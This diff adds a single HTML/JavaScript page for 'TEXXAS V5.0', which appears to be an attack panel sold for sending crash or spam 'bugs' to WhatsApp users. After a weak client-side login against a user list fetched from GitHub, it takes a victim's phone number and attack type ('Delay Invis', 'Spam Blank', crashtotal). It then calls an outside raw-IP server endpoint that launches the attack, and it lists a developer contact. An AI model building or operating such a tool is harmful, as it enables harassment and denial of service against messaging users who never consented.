@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ApocalypseWeb</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    :root { 
+      --main: #ffffff; 
+      --second: #cccccc; 
+      --bg: #0e0e0e; 
+      --text: #eeeeee; 
+      --success: #00ff88;
+      --error: #ff4d4d;
+    }
+    
+    * { 
+      margin: 0; 
+      padding: 0; 
+      box-sizing: border-box; 
+      font-family: 'Orbitron', sans-serif; 
+    }
+    
+    body {
+      background: var(--bg); 
+      color: var(--text);
+      min-height: 100vh; 
+      display: flex;
+      justify-content: center; 
+      align-items: center;
+      padding: 20px; 
+      position: relative;
+    }
+    
+    #particles-js { 
+      position: fixed; 
+      width: 100%; 
+      height: 100%; 
+      z-index: 0; 
+    }
+    
+    .glass-box {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 30px; 
+      backdrop-filter: blur(10px);
+      box-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
+      z-index: 2; 
+      max-width: 450px; 
+      width: 100%;
+    }
+    
+    .profile { 
+      display: flex; 
+      align-items: center; 
+      gap: 15px; 
+      margin-bottom: 25px; 
+    }
+    
+    .profile img { 
+      width: 65px; 
+      height: 65px; 
+      border-radius: 50%; 
+      border: 2px solid var(--main); 
+    }
+    
+    .profile-info h2 { 
+      font-size: 1.2rem; 
+      color: var(--main); 
+    }
+    
+    .status { 
+      font-size: 0.9rem; 
+      color: var(--second);
+    }
+    
+    .status i { 
+      color: var(--success); 
+      margin-right: 5px; 
+    }
+    
+    h1 { 
+      font-size: 1.4rem; 
+      color: var(--main); 
+      margin-bottom: 20px; 
+      text-align: center; 
+      animation: neon 2s infinite alternate; 
+    }
+    
+    .neon {
+      color: #0ff;
+      text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 20px #0ff;
+      animation: flicker 1.5s infinite alternate;
+    }
+
+    @keyframes flicker {
+      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+        opacity: 1;
+      }
+      20%, 24%, 55% {
+        opacity: 0.4;
+      }
+    }
+    
+    @keyframes neon { 
+      from { text-shadow: 0 0 10px var(--main); } 
+      to { text-shadow: 0 0 25px var(--second); } 
+    }
+    
+    input {
+      background: rgba(255, 255, 255, 0.05);
+      color: white;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      padding: 12px;
+      width: 100%;
+      margin-bottom: 10px;
+      transition: 0.3s;
+    }
+    
+    input:focus {
+      outline: none; 
+      border: 1px solid var(--main);
+      background: rgba(255, 255, 255, 0.1);
+    }
+    
+    .bug-options { 
+      display: flex; 
+      flex-direction: column; 
+      gap: 10px; 
+      margin-bottom: 20px; 
+    }
+    
+    .bug-card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      padding: 12px 20px;
+      display: flex; 
+      align-items: center;
+      gap: 10px; 
+      cursor: pointer; 
+      transition: 0.3s;
+    }
+    
+    .bug-card i { 
+      font-size: 1.2rem; 
+      color: var(--main); 
+    }
+    
+    .bug-card span { 
+      font-size: 1rem; 
+      color: var(--main); 
+    }
+    
+    .bug-card:hover { 
+      background: rgba(255, 255, 255, 0.1); 
+      transform: scale(1.03); 
+    }
+    
+    .bug-card.active { 
+      border: 2px solid var(--main); 
+      box-shadow: 0 0 12px var(--main); 
+    }
+    
+    button {
+      background: linear-gradient(135deg, var(--main), var(--second));
+      border: none;
+      color: black;
+      width: 100%;
+      padding: 14px;
+      border-radius: 50px;
+      font-size: 1rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 0 15px var(--main);
+      transition: 0.3s;
+      margin-top: 10px;
+    }
+    
+    button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+    
+    .small-logout {
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid var(--main);
+      color: var(--main);
+      font-size: 0.85rem;
+      padding: 8px 16px;
+      border-radius: 12px;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+      width: fit-content;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    
+    .small-logout:hover {
+      background: rgba(255, 255, 255, 0.2);
+    }
+    
+    #popup {
+      position: fixed;
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      display: flex; 
+      justify-content: center; 
+      align-items: center;
+      z-index: 999;
+    }
+
+    .popup-content {
+      background: #1a1a1a;
+      color: var(--success);
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      max-width: 90%;
+      box-shadow: 0 0 20px var(--success);
+      animation: fadeIn 0.3s ease-in-out;
+      position: relative;
+    }
+
+    .popup-content .close-btn {
+      position: absolute;
+      top: 10px; 
+      right: 15px;
+      font-size: 1.5rem;
+      color: var(--error);
+      cursor: pointer;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: var(--main);
+      animation: spin 1s ease-in-out infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .result-message {
+      margin-top: 10px;
+      text-align: center;
+      font-size: 0.9rem;
+    }
+    
+    .success {
+      color: var(--success);
+    }
+    
+    .error {
+      color: var(--error);
+    }
+    
+    .contact {
+      margin-top: 20px; 
+      color: var(--main);
+      text-align: center;
+      font-size: 0.9rem;
+    }
+    
+    .contact a {
+      color: #00acee; 
+      text-decoration: none;
+      display: inline-block;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+<div id="particles-js"></div>
+<div id="popup" style="display:none;">
+  <div class="popup-content">
+    <span class="close-btn" onclick="closePopup()">&times;</span>
+    <p id="popup-message"></p>
+  </div>
+</div>
+
+<div id="login-box" class="glass-box">
+  <h1>Login</h1>
+  <input type="text" id="username" placeholder="Username" />
+  <input type="password" id="password" placeholder="Password" />
+  <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Login</button>
+  <div id="login-result" class="result-message"></div>
+</div>
+
+<div class="glass-box" id="main-box" style="display:none;">
+  <div class="profile">
+    <img src="https://files.catbox.moe/p9k3t9.jpg" alt="profile">
+    <div class="profile-info">
+      <h2 id="userLabel">Api Bug</h2>
+      <span class="status"><i class="fas fa-circle"></i> Connected</span>
+    </div>
+  </div>
+  <h1 class="neon"><i class="https://files.catbox.moe/p9k3t9.jpg"></i>TEXXAS V5.0</h1>
+  <input type="text" id="target" placeholder="628xxxx" />
+  <div class="bug-options">
+    <div class="bug-card active" data-bug="crashtotal">
+      <i class="fas fa-skull-crossbones"></i><span>Delay Invis</span>
+    </div>
+    <div class="bug-card" data-bug="blank">
+      <i class="fas fa-bomb"></i><span>Spam Blank</span>
+    </div>
+    <div class="bug-card" data-bug="delay">
+    <i class="fas fa-clock"></i><span>Day Delay</span>
+    </div>
+    <div class="bug-card" data-bug="blank">
+      <i class="fas fa-eye-slash"></i><span>For Close Invis</span>
+    </div>
+  </div>
+  <button id="sendBtn" onclick="sendBug()"> Kirim Bug</button>
+  <button class="small-logout" onclick="logout()">Logout</button>
+
+  <div id="result" class="result-message"></div>
+  <div class="contact">
+    <p>Contact Developer:</p>
+    <a href="https://t.me/yunnhire" target="_blank">
+    <a href="https://t.me/yunnhire" target="_blank">
+      <i class="fab fa-telegram"></i> @yunnhire
+    </a>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+<script>
+// Initialize particles.js
+particlesJS("particles-js", {
+  particles: {
+    number: { value: 60, density: { enable: true, value_area: 800 }},
+    color: { value: "#ffffff" },
+    shape: { type: "circle" },
+    opacity: { value: 0.4 },
+    size: { value: 3, random: true },
+    line_linked: {
+      enable: true, distance: 150,
+      color: "#ffffff", opacity: 0.3, width: 1
+    },
+    move: { enable: true, speed: 2, direction: "none", random: false }
+  },
+  interactivity: {
+    events: {
+      onhover: { enable: true, mode: "grab" },
+      onclick: { enable: false }
+    },
+    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
+  },
+  retina_detect: true
+});
+
+// Database URL
+const DB_URL = "https://raw.githubusercontent.com/yunndev1/websitebug/refs/heads/main/database.json";
+
+// API Endpoint (fixed URL with https protocol)
+const API_ENDPOINT = "http://152.42.182.93:2023/dragon?";
+
+// Global variables
+let selectedBug = "crashtotal";
+let usersData = [];
+
+// DOM elements
+const loginBox = document.getElementById("login-box");
+const mainBox = document.getElementById("main-box");
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const loginResult = document.getElementById("login-result");
+const userLabel = document.getElementById("userLabel");
+const targetInput = document.getElementById("target");
+const sendBtn = document.getElementById("sendBtn");
+const resultDiv = document.getElementById("result");
+
+// Fetch users from GitHub
+async function fetchUsers() {
+  try {
+    const response = await fetch(DB_URL);
+    if (!response.ok) throw new Error("Failed to fetch users");
+    usersData = await response.json();
+    return usersData;
+  } catch (error) {
+    console.error("Error fetching users:", error);
+    loginResult.innerText = "Error loading user database";
+    loginResult.className = "result-message error";
+    return [];
+  }
+}
+
+// Session management
+function saveSession(user) {
+  sessionStorage.setItem("currentUser", JSON.stringify(user));
+}
+
+function getSession() {
+  const session = sessionStorage.getItem("currentUser");
+  return session ? JSON.parse(session) : null;
+}
+
+function clearSession() {
+  sessionStorage.removeItem("currentUser");
+}
+
+// UI functions
+function showPopup(message) {
+  document.getElementById("popup-message").innerHTML = message;
+  document.getElementById("popup").style.display = "flex";
+}
+
+function closePopup() {
+  document.getElementById("popup").style.display = "none";
+}
+
+function showDashboard(user) {
+  loginBox.style.display = "none";
+  mainBox.style.display = "block";
+  userLabel.innerText = user.username;
+}
+
+function resetLoginForm() {
+  usernameInput.value = "";
+  passwordInput.value = "";
+  loginResult.innerText = "";
+}
+
+// Event handlers
+async function login() {
+  const username = usernameInput.value.trim();
+  const password = passwordInput.value.trim();
+  
+  if (!username || !password) {
+    loginResult.innerText = "Please enter both username and password";
+    loginResult.className = "result-message error";
+    return;
+  }
+  
+  try {
+    if (usersData.length === 0) {
+      await fetchUsers();
+    }
+    
+    const user = usersData.find(u => u.username === username && u.password === password);
+    
+    if (user) {
+      saveSession(user);
+      showDashboard(user);
+      resetLoginForm();
+    } else {
+      loginResult.innerText = "❌ Invalid username or password";
+      loginResult.className = "result-message error";
+    }
+  } catch (error) {
+    loginResult.innerText = "❌ Login failed. Please try again.";
+    loginResult.className = "result-message error";
+    console.error("Login error:", error);
+  }
+}
+
+function logout() {
+  clearSession();
+  loginBox.style.display = "block";
+  mainBox.style.display = "none";
+  resetLoginForm();
+}
+
+// Bug selection
+document.querySelectorAll(".bug-card").forEach(card => {
+  card.addEventListener("click", () => {
+    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
+    card.classList.add("active");
+    selectedBug = card.getAttribute("data-bug");
+  });
+});
+
+// Send bug function
+async function sendBug() {
+  const target = targetInput.value.trim();
+  
+  if (!/^\d+(@s\.whatsapp\.net)?$/.test(target)) {
+    resultDiv.innerText = "Please enter a valid WhatsApp number (e.g., 628123456789)";
+    resultDiv.className = "result-message error";
+    return;
+  }
+  
+  const chatId = `${target}@s.whatsapp.net`;
+  
+  // Disable button and show loading
+  sendBtn.disabled = true;
+  const originalText = sendBtn.innerHTML;
+  sendBtn.innerHTML = '<span class="spinner"></span> Sending...';
+  resultDiv.innerText = "";
+  
+  try {
+    const url = `${API_ENDPOINT}type=${selectedBug}&chatId=${chatId}`;
+    const res = await fetch(url);
+    
+    if (!res.ok) {
+      throw new Error(`Server responded with status ${res.status}`);
+    }
+    
+    const data = await res.json();
+    
+    if (data.error) {
+      throw new Error(data.message || "Unknown error from server");
+    }
+    
+    showPopup(`Texxas Bug successfully sent to <b>${target}</b>`);
+    resultDiv.innerText = "Bug sent successfully!";
+    resultDiv.className = "result-message success";
+  } catch (err) {
+    console.error("Error sending bug:", err);
+    resultDiv.innerText = `❌ Failed to send bug: ${err.message}`;
+    resultDiv.className = "result-message error";
+    
+    // Show more detailed error in popup for debugging
+    showPopup(`Failed to send bug to ${target}<br><small>${err.message}</small>`);
+  } finally {
+    // Re-enable button
+    sendBtn.disabled = false;
+    sendBtn.innerHTML = originalText;
+  }
+}
+
+// Initialize app
+window.onload = async () => {
+  // Pre-fetch users data
+  await fetchUsers();
+  
+  // Check for existing session
+  const user = getSession();
+  if (user) {
+    showDashboard(user);
+  }
+};
+//yunshop
+// Add keyboard support for login
+document.addEventListener("keypress", (e) => {
+  if (e.key === "Enter" && loginBox.style.display !== "none") {
+    login();
+  }
+});
+</script>
+</body>
+  </html>
